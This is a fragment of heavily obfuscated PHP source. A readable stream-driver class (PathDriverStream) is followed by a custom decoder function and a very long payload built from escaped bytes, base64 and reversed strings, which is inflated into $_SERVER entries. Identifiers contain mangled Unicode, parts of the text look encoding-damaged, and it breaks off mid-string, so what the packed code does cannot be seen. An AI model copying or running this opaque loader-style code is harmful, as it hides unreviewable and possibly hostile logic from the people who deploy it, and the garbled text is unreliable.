$dחҝ = 0) { parent::__construct(); $this->source = $C; $this->sourceSize = $dחҝ; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Cԑ = false) { return $this->sourceSize; } public function getContent($aݽ = false) { return $this->fileSubstr($aݽ, 0, $this->sourceSize); } public function fileSubstr($DЛ = false, $Bէ = 0, $F̵ߗ = 0) { if (!$F̵ߗ) { $F̵ߗ = $this->sourceSize; } $dŴ = $this->sourceSize - $Bէ; if ($F̵ߗ >= $dŴ) { $F̵ߗ = $dŴ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Bէ, $F̵ߗ); } if ($this->sourceType == self::TYPE_FILE) { if ($F̵ߗ <= 0) { return $_SERVER[̉][33]; } $A = ftell($this->source); fseek_64($this->source, $A + $Bէ); $c҃ = @fread($this->source, $F̵ߗ); fseek_64($this->source, $A); return $c҃; } } public function hashMd5($Bș = false) { return md5($this->getContent()); } public static function hash($eĖݏ, $D = 0) { $d = new PathDriverStream($eĖݏ, $D); return $d->hashSimple($eĖݏ); } public static function md5($DѰć, $c鿊 = 0) { $EΏ = new PathDriverStream($DѰć, $c鿊); return $EΏ->hashMd5($DѰć); } } goto bϏЏʤ; B忦: if (!function_exists('_kodDe')) { function _kodDe($a) { $a = base64_decode($a); $cŽ = strlen($a); $Eλ = ''; $B = ord($a[0]) - 30; for ($C◟ = 1; $C◟ < $cŽ; $C◟ += 2) { if ($C◟ + 1 < $cŽ) { $Eλ .= chr(ord($a[$C◟ + 1]) + $B); $Eλ .= chr(ord($a[$C◟]) + $B); } else { $Eλ .= chr(ord($a[$C◟]) + $B); } } return $Eλ; } } define("\246\232\314\211\204\375\327\314\322", "\237\374\370"); $_SERVER[̉] = explode("\174\1\174\3\174\5", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\255\175\11\174\24\105\326\270\367\175\55\352\172\354\52\115\70\162\60\107\22\356\100\22\46\311\204\14\114\62\141\146\302\231\70\364"."\xcc\xf4\x4c\x3a\x99\x99\x9e\x74\xf7\xe4\x2\x54\xd4\xf5\x0\x95\x65\xc1\x73\x3d\xd6\x45\x76\x15\x11\x14\x5\xef\xfb\x42\x14\x5c\xaf\x3d\xc4\xf5\x6\x44\x5d\x8f\x55\xf1\x66\xbf\xba\xab"."\272\147\342\176\337\357\377\347\7\114\325\253\243\253\136\125\275\172\357\325\253\127\327\176\170\333\253\367\334\160\351\277\327\156\132\162\360\222\103\227\34\176\377\312\33\156".strrev('wn9mǉt9:+C9,%low')."\xb\x2f\xfa\x8e\xdf\xb9\x61\xa6\x77\xcf\xda\x17\x6\xf6\x1c\x7c\xd0\xea\x1b\xbe\x1a\x5b\x5\x32\xe3\xb2\x55\xf8\x47\xca\x68\xa6\xa4\xf4\xab\x86\x69\x60\x40\x4c\xcb\x24\xd4\x24\xe\xab".base64_decode('Gfzrxj9GT0o1FRyOtATCkVBba6s3GI6QGsX0tBYnoaysy2lSeVbRDfApsbpIVg==')."\xcb\x2a\x19\xb\x84\x3\xe2\xb2\x29\x47\x65\x83\xd4\xd4\x50\x17\x69\xf0\xb6\xfa\x3\xf3\x23\xe1\xf9\xad\x5e\x92\x23\x1a\xe9\xc9\x29\xfa\x0\x8e\xa1\x60\xc8\x94\x75\x33\xac\xa6\x15\x96"."\243\117\147\355\252\363\316\360\265\110\341\240\247\45\344\251\17\373\2\55\30\134\37\150\156\366\205\363\341\301\200\337\137\347\251\237\225\237\322\32\364\314\150\366\110\240"."\175\51\45\242\146\22\132\211\264\10\247\54\222\112\161\240\121\125\122\161\34\314\310\264\71\346\100\226\204\302\54\4\306\40\223\113\245\160\244\205\205\110\373\225\204\234".base64_decode('SxGcNYiRrK6mZdr1WcoAg+KAnDM1NRPDEW+/qcscDloc05W0kiFVhbx+b31Ygg==')."\315\224\32\203\201\146\211\14\105\132\66\114\105\227\346\66\171\203\136\11\66\275\272\30\365\270\130\302\345\332\132\0\102\44\217\337\57\15\125\203\251\244\263\264\32\134".base64_decode('pkBlgWCDNyjVzZc4nmJaOq1lXKAWMJ6m0FRvMIgDDjKD/T44dCQSaGwMeVmMdA==')."\156\266\37\264\144\34\231\245\226\130\74\221\62\43\275\162\52\107\47\153\67\376\55\46\77\344\127\63\310\4\356\121\63\152\216\114\126\122\205\246\261\225\103\2\71\232"."\x5b\xa1\x10\x25\x4e\x2\x69\x50\x5e\x23\x8b\xb\xac\xb4\x5e\x1c\xac\xae\xc1\xbf\x53\x49\xa6\x68\x4\xa6\x29\xba\x19\x51\x32\x31\x2d\xae\x66\xc8\x7a\xac\x25\x6b\x8f\xcc\x40\xd9\xec\x6c"._kodDe('KEvGhYaeSlivbFBPlhvhP5MfnsW7UYxBOAu7vZOWqY6ucDgEm5sAaFEnX4EBMLw=')."\325\124\134\247\253\364\347\162\2\72\240\46\6\370\152\64\264\234\36\123\174\140\275\360\262\255\254\45\25\44\223\142\232\240\323\6\355\127\133\66\245\311\361\220\242\13"."\x7d\x6d\x4\x5\x3\x39\x53\x4\xe6\x50\xb6\x46\x4d\x4f\x37\x0\xba\x41\xbe\xf\x56\x8b\xda\x56\x20\xa1\x9b\xae\x97\xb8\x80\x42\x17\xa1\x77\x25\xb\x97\x39\xf\x74\x2c\x9c\xe\xfe\x2b"."\x25\xc4\xaf\x9d\x34\xad\x53\x49\xa5\x22\x4a\xbf\x42\xd6\x55\x3a\x3e\xc1\xa0\x7d\x75\x1b\x51\x35\xe3\x6\x10\x1c\xf5\x5\x22\x9d\xb2\xd1\xd9\x1c\x9f\x10\x41\xa5\x28\x4d\x8d\x2b\xfd\xae".strrev('S$(,!_ZG!d6fw)JrbҜzfN-ڶ},gl').base64_decode('g0OKS83SfKmpSq0yaMF0ioVo7xjMYECzn8yYIhJX+k2CFGlqrFPWwXBV58yEcw==')."\62\241\57\331\154\112\215\311\246\252\145\334\132\314\124\114\247\141\352\212\114\152\363\304\142\212\141\70\353\265\214\251\153\51\247\47\225\322\372\234\1\135\115\252\231\52"."\xa9\x8c\x50\x63\x90\x8\xd6\xbb\x13\x52\xc8\x2a\xb2\x88\x8b\xa6\x4a\x70\xae\x40\x2\x51\x86\xbf\x46\x17\x27\xcb\xad\xcb\x19\x23\xa1\xe8\x4e\x2f\x59\x34\x55\x12\x18\xf\x46\x20\x69\xb6"."\6\325\310\152\206\12\233\127\45\311\246\51\307\72\41\161\341\325\127\377\114\176\65\223\122\63\112\136\136\157\177\126\325\25\203\266\125\232\321\34\46\225\200\332\25\147".strrev('U-.2C'."\n".'0t:j	'."\0".'-fE͔r\'.')."\73\103\200\230\23\360\270\362\361\22\230\66\22\115\303\320\246\160\270\65\342\153\4\173\166\213\67\322\354\11\327\67\221\146\233\162\222\266\331\17\110\64\253\222\2\347"."\x39\xc1\x12\x83\x13\xab\x5\xf4\x95\x3\x5b\xb5\x3e\x45\x7\x1f\xae\x1b\xa8\x92\xba\xb5\x78\x54\xeb\x77\xd1\x24\x98\x39\x4\x68\x8\xcd\xc\x87\x3b\x6b\x3a\x83\x72\x26\x9\xf1\x13\x1d"."\x30\x15\x32\xfd\x8c\xde\xa4\x15\xd1\x7e\x25\x93\x34\x3b\x69\xc1\x90\x37\x38\xc7\x1b\x8c\x84\x2\x8d\xe1\xb9\x9e\x20\xd9\xed\x33\x60\x96\xf4\xd3\x4f\xc1\xaa\x53\xce\xa0\x12\x7\xa8\x8f"."\231\264\234\234\205\130\243\171\340\302\200\143\105\123\341\142\241\151\176\337\14\210\230\6\247\1\62\71\305\134\264\156\277\232\126\141\333\115\226\202\60\11\130\201\31\244".base64_decode('QW7Uoer2zrKS9vjYUif4v6x0YXuDq6yj1q3yMu4KV4VUWT5RagW8iSqnJNLpvA==')."\x1c\xe5\x52\x60\xd6\xcf\x20\x0\x6e\x5d\xc2\xb2\xb6\xa1\xe\x3\x83\xde\xd9\x6d\xde\x50\x38\xd2\xec\xd\x37\x5\x1a\xc8\x17\xbc\x1e\x12\xf2\x6b\x78\x69\xd2\x1e\x2d\xc4\x3f\x1d\x2e\x4e".base64_decode('j8GY+9Jy0kalYaxZ0xUrhO8ac9U4JeMw2qSoyU7SPxXWFtNSmi6nIBWjk1ihlA==').strrev('ٔl2MʨIM`Bt5!#ɂ`&%')."\7\376\162\62\34\327\322\62\345\166\21\111\122\342\230\46\141\120\231\45\245\111\221\371\176\151\352\246\6\241\272\45\113\263\142\166\152\144\220\222\12\155\122\216\265\215".base64_decode('tjKupBSKjU6FkvRykg3sTAxXCUbeAeMGoHxLVY0gKAkZKRqfC/ldDjBZ1hTYTQ==').strrev('6Ʋ|B0iYF.%BJ̼hP\'\\.').strrev('ZNbqe"vw0HI|m/a}C	hR?')."\x48\xac\x71\x18\x50\xe7\xac\x96\x31\x14\x67\x8c\xd4\x16\xe7\x64\x1d\xe7\x98\x6a\xa3\xe9\x79\x25\x38\xe7\xde\xef\x94\xd3\x83\xce\x34\x40\x93\x93\x35\xdd\xba\xc3\x4a\x61\x71\xa3\xf6\x91"."\161\345\344\33\42\26\10\106\164\153\157\15\204\110\201\132\10\5\334\123\124\321\111\73\132\333\110\122\132\230\123\63\274\4\170\14\335\255\145\302\73\171\346\206\50\351"."\xcd\x81\xfc\xba\x3a\x28\xf3\x3e\xd6\xd2\xf6\x90\xba\xfb\xd3\x29\xce\x10\x5a\x7b\xe5\xe4\x63\x11\x6e\xf2\xb5\xcc\x8a\x34\x7\x1a\xbc\xfe\x88\xaf\x5\xd0\xa5\x70\x3e\xbc\xad\xb5\xc1\x43".base64_decode('B1eE1wXCTRZoG6BMczx+nz27d54vFA4VTAKwNq8tBciCrUFvo28eizb6vP6GUA==').base64_decode('pN5T38TztHiaSSSSgNKY4bbmjwASG2IyXaQXyqcUWRGLABWhokGEzwOwXSpk7g==')."\x91\xee\x42\xa9\x18\xf5\x84\xf0\xe8\x31\x2d\x47\x67\x23\x63\x13\xd3\x94\xaa\xa4\x65\xb2\xac\x64\xba\x15\x96\xe0\x9f\x52\xc9\x13\x92\xcc\x6c\x84\xd1\x8f\xe8\x0\xb\xa2\x6e\xd0\x38\x60"."\10\311\367\45\102\356\363\132\20\201\171\352\224\4\243\334\205\1\236\204\311\250\200\55\16\326\5\117\3\43\340\101\342\67\230\11\150\104\42\164\255\31\100\136\361\320"."\346\44\270\350\33\11\264\172\203\36\50\70\107\346\6\3\55\63\110\201\276\116\205\66\300\107\320\137\102\331\47\42\77\233\234\204\1\336\107\246\42\24\107\172\227\106"."\121\271\4\377\214\301\77\200\355\43\37\127\62\24\353\121\110\315\31\141\240\62\21\130\15\224\22\153\71\366\265\250\246\245\350\72\5\34\0\243\7\114\362\356\62\350"."\44\351\247\304\147\54\335\322\310\216\22\16\314\362\266\104\350\314\302\61\141\66\142\0\220\145\3\101\202\20\123\353\246\2\25\116\14\172\103\164\225\353\112\117\116\245"."\350\162\273\306\222\131\254\200\115\213\174\336\175\116\173\337\330\222\205\316\261\256\16\20\50\55\233\216\243\44\326\356\262\104\107\221\362\71\235\225\206\214\121\211\121\133"."\x5a\xd5\xee\x6e\x77\x97\xd4\x56\x2d\xf4\x38\x7\x65\xe7\x60\xb9\x73\x8a\xb3\x63\x6c\xbb\xab\x74\x2c\x1\x74\x2c\xae\x74\x8c\x5f\xa\x33\x80\x8c\xb5\x23\x3b\xc0\x4f\x75\x7b\xed\xe8\x76".strrev('H%&[61a,N-iYG_{dkDv5\\Q_Ms')."\x81\x26\xc\xaa\x59\xe\x5d\x3c\x71\x29\x85\x83\x31\x54\x92\xbc\xc4\x42\x67\xfb\xd8\x8e\x5a\xa1\x9c\x0\xb2\x7f\xb\x30\x4b\x80\xfe\x76\xb2\x7c\x1e\xe7\x2\xd8\x33\x56\x14\xae\x7b\x32".strrev('{Q3\'U	2J~&@KƏn2jD]pr?')."\250\16\42\243\364\220\200\146\322\371\35\125\314\76\205\116\17\0\267\304\301\344\240\202\41\110\22\142\51\304\26\222\57\160\1\115\101\322\12\351\105\66\2\171\262\76"."\26\213\53\31\62\116\107\223\334\106\114\316\52\41\241\207\221\110\330\123\347\367\106\50\205\41\224\230\306\21\125\254\143\132\73\320\65\116\121\51\175\210\161\46\35\311"."\43\144\345\33\75\51\11\21\6\111\321\165\115\257\102\332\111\43\227\205\314\34\220\275\114\200\133\11\10\356\122\165\215\204\121\116\312\105\304\1\310\312\224\163\200\262"."\x34\xe3\x6\xdc\x25\xed\xed\xb9\x85\x4a\xbc\x63\x21\x98\xd4\xb2\x33\xd1\xb1\x78\xdc\xd2\x52\xca\xa3\xbb\xdb\xc1\x1f\x1a\xc1\xb4\x8c\xb4\x3e\xcb\xc7\xd2\x0\xcc\x1a\xe5\x9c\x3c\x5\x94".base64_decode('aBFGDSNgf3bBdjA9iCXCknFU0xnTlLWw3aZmyilLFWEIoaSJbtxEZYBH288pFg==')."\334\312\5\35\44\42\247\55\114\301\306\24\40\202\372\13\226\10\51\246\213\345\160\10\211\370\377\352\42\112\341\63\140\15\325\13\373\33\126\332\204\6\14\123\111\133"."\xf4\x94\x86\x22\xeb\xb1\xce\xc6\x5c\x2a\x65\x32\x8e\x3f\xa5\x76\x93\x6a\xc9\x2\x59\x54\x28\x6f\xa3\xa6\x53\xc9\xb6\x8c\x7c\xb7\xa8\xac\x50\x46\x5f\x26\x3\xe4\x50\x71\x42\xf1\xad\x74"."\x86\x7\x30\x2d\x61\xa9\x84\xea\xf4\x24\x5f\x8b\x54\x17\x8\xf8\xbd\x9e\x16\x9\xee\xda\x64\xb7\xf1\x35\x38\x69\xf9\x79\x4e\x1f\x91\x96\x58\x40\x8d\xd3\x41\x0\x94\xcc\xa4\x50\xa2\xcd".base64_decode('IjHIPDqg4sYBWQQHaJYDSkIOzrA7uDrMwdhlB+GiHaasgw0esrkk6GtwqEYDEg==')."\21\120\275\50\211\266\303\354\204\232\211\224\74\340\300\155\362\53\275\112\312\101\133\344\240\15\165\120\26\337\201\104\266\6\322\232\66\60\305\111\153\120\20\320\274\116"."\x7\x1c\x7e\x38\xfb\x1c\x5c\x4b\x47\x3e\x27\xc8\x14\xe\x2e\x6f\x38\x92\xba\x96\xcb\xb6\xd2\x2f\x9\x31\xdc\x18\x2\xe0\x2d\x65\x80\xa0\xa6\x99\xe\x2a\x43\x3a\xf2\xc5\xcb\xc2\x28\x2b".strrev('-/4<cd>KH1hV=|ɷct')."\217\106\271\127\234\124\205\46\30\335\15\350\144\344\332\162\256\314\345\334\251\135\116\264\253\142\341\107\303\162\62\44\174\316\224\223\364\133\5\122\161\70\250\304\6\142".strrev('CYxڹe	xBkX$l\\').strrev('C((;dDWx!%_DA 0ri()$@[')."\62\341\52\161\362\41\27\242\344\107\325\42\30\357\221\64\223\342\331\100\330\10\72\34\227\126\65\63\240\146\104\55\13\207\362\75\201\157\111\160\342\332\364\102\15\103".strrev('slK#It	NZ5\'m'."\n".'Z'."\0".'\\-X8Z-1').base64_decode('0hUGpznXXcEsPCpkS8i9fLu0lBHWiWEO0NaLQWulONowVKSJidqFouISVA0/wA==').base64_decode('XaEw6mlYKxiFCiAa1tD8p+exlt0MCaslFEa2xYggwrKVaS2HG+hhxA3wlylAyQ==')."\165\27\134\114\63\40\141\26\211\43\43\146\6\334\4\160\130\310\224\265\323\160\313\36\223\7\312\317\310\166\33\33\324\26\345\37\267\320\51\62\313\263\131\45\23\207"."\131\204\305\146\251\226\352\24\345\70\20\347\135\72\246\211\56\300\13\222\323\101\107\271\260\121\363\205\275\330\100\354\21\241\241\113\155\370\62\201\334\31\225\165\227\16"."\x3e\xcc\x9b\xcc\x69\x6\x61\xf4\x72\xc\xd0\x41\x7a\x80\x2a\x2d\x54\x2\xa7\xf8\x35\x2a\xb4\xc0\x85\xe3\x8d\xab\x26\x84\x40\xba\xa8\x51\x95\x24\xcf\x28\x9c\xd5\x31\x98\x48\xb6\x20\xb2"."\134\171\243\304\371\71\307\150\113\316\102\173\202\253\14\221\161\27\337\265\304\75\117\74\216\204\7\232\70\44\234\341\247\331\11\47\2\272\14\123\313\362\24\41\212\223".base64_decode('hSReqZCLoR+1CdDxOOJ1ONJQXlIWCTd4wrtSIIegNvc1eHSdzg/cIahJBUARBA==')."\x17\x77\x88\x6a\x84\xb\x51\x6b\x5c\xb9\xb7\x97\x9f\xcd\xe3\xaa\xe0\x87\x5d\x78\x9b\x71\xc9\xf1\x78\x80\x6a\x36\xc5\x70\x7e\x56\x51\xd1\x53\xb8\x22\x64\x2e\xc1\xaa\x12\x62\x85\xb3\x7b".strrev('&PCoCH%fw;m#u.EO!Gi2#XV/Yj~)R')."\76\240\205\343\140\273\253\357\124\63\212\301\166\55\335\50\320\143\70\63\207\32\46\230\46\250\342\200\264\11\0\342\206\300\364\115\234\50\10\173\36\332\77\42\246\145"."\267\16\242\72\204\251\152\301\76\130\32\30\223\215\272\226\366\5\300\324\57\74\37\354\371\24\252\161\103\24\246\137\55\324\121\60\176\160\253\37\252\116\232\314\252\342"."\174\301\307\27\177\174\323\206\177\275\374\5\216\375\341\166\374\133\71\231\230\140\40\233\250\203\161\230\333\104\375\146\336\142\355\203\71\247\236\166\351\211\233\227\172\167"."\x3d\xfe\xe2\xce\x5d\xe3\xd6\x78\x6f\x7c\x71\xe4\x75\x9f\x8c\x5a\x3d\x30\xea\xa1\x7f\xbe\xb2\x65\xe3\xbf\x3e\x3e\x23\x99\x8a\xac\x5c\x7a\xe3\x65\x97\x1c\x8\x1d\xfc\xaf\xfd\x2b\xff\x58"."\264\274\341\27\107\225\375\166\372\5\275\143\227\55\170\171\271\126\77\161\337\175\357\274\361\315\233\335\123\377\341\274\243\163\357\133\106\144\357\322\163\237\373\366\315\173"."\x2e\x5b\xf6\xf6\x81\x4f\x77\xbd\xbd\xf8\x87\xa9\xde\x3\xf5\x4b\x5f\x78\x77\xed\x3b\xaf\x6d\xb9\xfc\xfa\xc4\x99\x17\xdf\xde\xb3\xfd\xcd\x31\x67\x6e\x2e\xee\x3f\xf5\xbd\xf3\x7f\x39\x21"."\65\154\370\11\57\235\265\131\275\176\371\55\257\347\316\152\11\335\74\354\367\33\356\176\151\357\266\57\307\334\362\302\163\67\235\265\363\316\67\347\271\276\370\317\312\312"."\137\265\134\166\372\276\155\133\137\57\177\374\321\256\213\135\323\356\231\261\55\130\131\163\363\212\277\351\57\156\311\165\375\342\276\247\132\236\52\252\274\375\357\267\255\376"."\313\272\307\345\246\313\334\337\156\333\74\366\255\332\233\216\133\372\311\111\313\327\135\64\361\342\165\322\153\177\77\345\312\357\153\226\277\366\370\126\363\206\321\223\377\176"."\363\373\137\25\15\233\171\266\243\70\166\261\117\133\362\346\357\167\276\366\376\363\347\237\374\351\274\215\313\136\132\361\326\223\17\215\174\373\52\355\356\145\237\255\72\50"."\xbc\xef\xfd\x7\x3e\x92\xd6\xbb\xc3\xa5\x1f\xdf\x38\x69\xd6\x6f\x7e\x59\x96\x7a\xe3\x37\x97\xd4\x3e\xb0\xf6\xd1\x2d\xc7\xf7\x3d\x7e\xe2\xd6\xf1\xeb\xaf\xba\x63\xc1\x7c\x4f\xf3\x1f\xfe"."\x72\xc5\xcb\x25\xea\xbc\x4d\x25\xc7\xb7\x54\xdc\xa5\x3e\xf0\xf8\x9b\x4f\xdc\xf6\xc2\x91\xaf\x9e\x71\xdb\xd6\xd5\x27\x1c\xb1\xb6\xbe\xe6\xad\xb3\xae\xec\x7d\xa3\x7e\xc2\xac\xed\xfb\x7a"."\x3f\xbd\x7f\x55\x70\x63\xf4\xce\xf5\x6b\x26\x2b\x27\x37\xf4\x36\xdf\xf1\xda\xd8\x5\xeb\x9e\x29\x7d\xe1\xf1\x11\xcb\xdf\x7a\xa5\xeb\xb6\xd9\x7b\x4e\xd9\x73\xcd\xd8\x47\x66\xdf\x3e\xe9"."\x8e\x33\x3f\x3f\xb3\x71\xd6\x69\x72\xfd\x8c\x9\x1b\xce\xaf\x72\x3c\x77\xe7\x9a\xed\x4d\xdd\x6d\x63\xef\x4a\x5e\x78\xb5\xb2\x6e\xc1\x9d\xd7\x1f\xd1\xef\xff\x64\xfa\x33\xe3\x8e\xdd\xb4"."\342\351\25\77\25\155\373\156\171\142\336\301\123\67\74\163\137\174\377\256\213\276\173\177\374\153\271\137\237\277\171\351\107\167\56\134\367\247\314\304\173\365\277\256\136\361"."\143\262\363\360\173\265\177\274\362\154\362\226\223\317\310\235\65\167\115\345\303\257\125\157\236\175\321\322\117\77\362\156\160\157\253\151\277\142\122\262\361\344\373\326\124\256"."\137\66\361\204\153\27\237\357\371\363\354\351\167\217\233\71\357\310\134\64\373\216\64\277\252\341\204\235\73\37\232\174\320\363\35\227\137\261\363\220\217\137\270\362\253\211".base64_decode('1Z/vGHnzA/ee0NdfctRfn5405pbjF/76k4uXxBe8+MURn390/QPXXrKnvyl+6w==').base64_decode('McMW9/guu2bHGYdWT/rXUc5/7zs7N71qzxP+nj8cceT8/Y5/N5xyxpW7d/5yXg==')._kodDe('MpC/dNCG+6Z74tFLs5pnb+ub04NZq3LZoLjMsxondarqu0yzJyTZ32WbW9ljKGM=')."\165\322\214\216\207\153\22\211\317\116\336\165\322\21\207\5\167\175\31\134\271\163\133\106\132\376\303\323\311\227\217\64\66\367\246\57\270\374\222\253\377\166\267\363\223\267"."\106\235\350\174\156\130\170\370\216\207\356\322\127\77\271\377\255\121\211\26\143\134\340\256\263\367\365\316\371\321\361\100\54\66\52\370\354\5\33\256\113\276\167\313\156\327"."\x97\x6b\xe\x5d\x7b\xd3\xcb\xed\xf\xdf\x34\x7b\xd5\xad\xbe\xde\x51\xbb\x8f\x5a\x32\xe6\x1f\xff\x34\xa6\x9d\x59\xfd\xf1\xf5\xff\xbc\xbf\xb3\xbd\xef\xb5\xd7\x1e\xbe\xe1\xd9\xf1\x33\x37".base64_decode('vnTirYd+9PSEO6dsiM109tUcPnzS7M69mb2xo754c9X0eP/Yu9++3HH34hs/mA==')."\xb9\xe0\xbd\xdf\x2c\xb9\x76\xd4\xb2\x96\x8b\x8f\x7c\x72\x4d\xf5\xf3\xfd\x9f\x7c\x3d\x65\xf9\xee\x9a\x5\x27\xad\xaa\x69\x3b\x63\xfd\xdf\xe6\x5e\x7d\xd8\x71\x2b\x7f\x77\xca\xea\x77\x2f"."\73\155\223\277\154\346\366\47\214\211\367\164\37\361\333\133\316\222\137\274\161\277\371\227\331\53\337\270\347\221\15\203\27\355\220\246\312\265\213\66\175\365\346\270\155\27"."\224\74\176\305\365\313\73\72\22\307\354\37\277\153\102\266\371\167\123\177\167\346\135\67\256\375\354\226\105\75\27\236\164\344\111\117\117\321\217\277\352\124\167\342\204\333"."\x4f\xaa\x99\xb7\xed\xc2\x9d\x47\xcc\xb8\x3f\x5a\x36\xf3\xf0\xdf\x17\x1d\x7e\x7a\xe5\x81\x77\x16\x4c\x58\x31\x3a\x7a\xf6\xfc\xd7\x6f\x9c\x7f\xc2\xce\x5f\x84\xb7\x97\x94\x1d\xbe\xf3\x4e".strrev('\'Wc׍yW+9+^^,ߛi')."\xb9\xfc\x57\xf7\x5f\x97\x59\xf4\x64\xdd\x96\x13\x6f\x3a\x78\xe2\xb0\xd3\xdf\xdf\xfe\xe2\xa9\xdb\xab\x2b\xee\x18\xf7\x8b\x43\x2b\x2e\xfe\x63\xf0\xcc\x11\x7a\xcb\x99\x8f\x9e\xb7\xfd\xf0"."\123\117\235\172\366\237\377\264\371\202\33\326\237\267\375\274\226\103\173\257\132\26\73\366\216\15\7\56\173\52\145\134\60\367\374\103\377\222\32\261\370\313\123\226\17\306"."\x27\x27\x3a\xe6\xbe\x78\xf1\x5\xdd\xd7\x4d\xbd\xe7\x9c\xa7\x7e\x1d\x1c\xb9\xb7\x6e\xf0\xb9\x11\x99\xd9\xc5\xe7\x3c\xfd\x87\x37\x2e\xf8\x65\xec\xa2\xf\x8e\x38\x7a\xad\xba\xea\xcc\x35"."\xbf\x7f\xe5\xfa\xaf\xa6\x1c\x79\xfc\x3\x3f\x3c\x3b\x6c\xd6\x2f\x4e\xd9\xf7\xd2\xd4\xf\x9f\xe9\x37\x8b\x7\x77\x7e\x74\xc1\xe4\xc9\x1b\x23\x2f\xcd\xef\x2d\xf7\x7e\x93\x3d\x65\x46\xf3"."\347\316\205\257\350\146\354\37\77\355\137\367\351\227\317\54\377\351\102\157\353\57\127\145\167\53\257\56\133\171\341\370\307\26\155\272\350\224\147\112\332\76\130\121\371\273".strrev('ƛ>7wyfx^s>?ʆ濿v}w}wZ͍')."\x8e\xaf\x6f\x9d\x74\xdd\xcc\xaf\xf6\xc6\x4e\xfe\xe1\xc9\x27\xbe\x49\xdc\x33\x32\xf7\xca\xc7\xdf\x8c\x79\xe4\xe8\xec\x5d\xd3\x37\x8e\xfd\x7c\xc7\x3b\xd9\xaa\xd8\x17\xb7\xf5\xee\x7f\xe3".base64_decode('kksekf/62ePvKs/effTHR53wl8qvt5z22+++n/X68szqkxr+fu5X26sPzV3x6g==')."\x33\x95\xf3\x37\xbc\x9e\xba\x6d\x70\x61\xe9\xae\xbe\x29\xcf\xb4\x9f\x7e\x53\x70\xfd\xc7\x8d\x8f\x94\x9d\xf3\xce\x21\xc6\x51\x8f\x9e\xfa\xd8\x92\x6b\x46\xae\x91\x7f\xfc\x6a\xce\x5d\x17".base64_decode('rV644ce1D52x8cpLbzu48arqjjuvcz/25N5Nj936q9dn3nnu4u4fdt95zbIvmw==')."\xef\x9a\xf8\xf5\xb0\xf5\x57\x9d\x7a\x70\x7c\x75\x6a\x97\x72\xdf\x5b\x47\xcd\xb9\x6c\xd2\xa2\x7d\xfb\xdc\xc3\x6b\x7f\x7a\xea\xa5\x8d\x35\x3f\xbc\xf0\xfa\xea\x3e\xd7\x7f\xbe\xda\x39\x69".strrev('}q?>}߻o2Zo_%').base64_decode('+l3fuTe0bb3+QU/LsTeMn/bmjoGyW//0xxWlK1Yq7t7id27oMtbJV5fl1l4diA==')."\xd\x1e\xe7\x9d\x52\xda\x78\x63\xb4\x61\xc4\x4f\x97\xd4\xf4\x1f\xd6\x71\xd7\xd\xa3\x92\xab\xb6\xdc\xdd\xb3\xee\x82\x5\xb9\x83\x3f\xbc\x59\x1e\xb5\xa3\xf1\xfb\xca\x9d\xf\x2d\x7c\x7e"."\xe4\x3f\x5f\xab\xfa\xdb\xb7\x4a\x49\xc6\xb3\xa4\xfb\x42\xe3\xef\x67\xcf\x79\xf5\x69\xe7\xfc\xab\xbf\x3f\x72\x66\x4d\xd1\xa2\x6b\x6e\x1c\xad\xa7\xcf\x1e\xbe\xe2\x41\xc7\xea\xfe\xe5\x4b"."\346\235\170\311\55\237\77\232\271\366\216\111\307\156\312\244\153\337\70\167\367\326\67\56\330\277\155\303\137\313\126\156\335\252\275\275\353\263\300\103\316\127\47\127\277\360"."\xf6\xa9\x93\x97\x3d\x38\xbd\x74\xfb\xbe\xe8\x27\x97\x6d\x5b\xf1\xc8\x96\xfe\xb3\x32\x6b\x36\x29\xf3\xde\xba\x25\xf8\x47\x57\x8f\x79\xf1\x27\xad\xf\x9e\x37\x3d\x34\xdc\x7f\xcf\x69\xa3".base64_decode('nz6h6rIxT8w55/Lzbjn/9LpXS1sPuSKbWhPKRYefutx/8P5Tj/njW+O2RV671g==')."\131\377\333\347\164\147\325\272\155\107\76\352\251\235\170\114\347\53\177\277\365\252\332\73\257\377\361\167\207\175\165\332\31\347\367\157\335\65\354\331\253\366\376\242\147\123"."\253\243\345\247\153\43\357\57\232\21\173\176\356\133\253\157\215\266\352\133\373\356\176\63\165\352\226\13\226\255\76\47\363\300\232\175\247\37\67\73\372\237\3\47\316\272".base64_decode('RP5xT2787+q3lrV3hGYOvpabU/znAwMPjD/r4jcWfDP83sUn/vDGuXec/9Kkbw==')."\376\374\356\375\343\152\66\175\172\371\376\111\63\167\274\74\147\307\77\262\257\235\361\315\254\163\337\256\161\275\374\303\211\333\17\117\156\251\211\64\367\56\36\367\372\307".base64_decode('Xz800bXhzNF95216dGrFvvhx2+86pEMtuXjO7Qe9pz5679LFd7z+r1nXPLtt9g==').base64_decode('+9HLX7p9/T3XZVcevm7RrDmO0w7Zv3lv8KFVJz1dMT80LJY4d9UszxuHN252fg==')."\xfc\xf9\x55\x75\x97\xd7\x9f\xd7\xbf\x62\x9d\xb9\xa7\xae\xe4\xaf\x2f\xde\x18\x32\x2f\x3e\xe4\x9f\xf7\x4d\xeb\x99\xff\xe1\x98\xd6\xef\xf7\xdf\x71\xd0\xf9\xef\x3c\x73\xff\xaa\x15\x53\xff"."\x7a\xf2\x9f\xda\x7a\xc6\x5e\x3a\xe5\xc4\x6b\xef\xc8\xbd\x71\xd2\x3\x4f\x6f\x19\x19\xbd\x7e\xf3\x49\x77\x5e\xe7\x3f\x70\xf0\xbf\x47\x5c\x32\xe5\x89\x25\xd7\xcc\xfe\xeb\xb0\xaa\x29\x9e"."\x73\xcf\xee\xab\xbf\xe4\xb8\x9d\x97\x7d\xb9\xe0\xa8\xb1\xbe\xad\xf\xde\xfc\xe4\x31\xbb\xa6\x9f\x33\xf5\xe4\x91\xdd\xa9\x1b\x17\x66\xa6\x9e\x72\xdd\xcb\x8b\x5a\x5d\xe3\x46\x7e\xbf\x66".base64_decode('Ql+V/+tbd12+q2HyJ4evPe7V9vNXdb+gVdWedOmydZeq2qjlpx/6+qHuo9c/8Q==')."\xe6\x55\x37\xcf\xc8\x9c\xbb\xf4\xf1\xbd\x87\x1c\xf1\xfe\xb7\xdd\x7f\x74\x57\xad\x89\xde\xf0\xfc\xf1\xa9\xd8\xf5\x2b\xea\x3f\x28\x9a\x7a\xcc\x86\x3f\x6c\x9b\xf6\xf4\x8e\x23\x66\xbf\xf7".base64_decode('2oOpQ4ddfuwL1700TT2/76RZZy0as+rZ9UVXN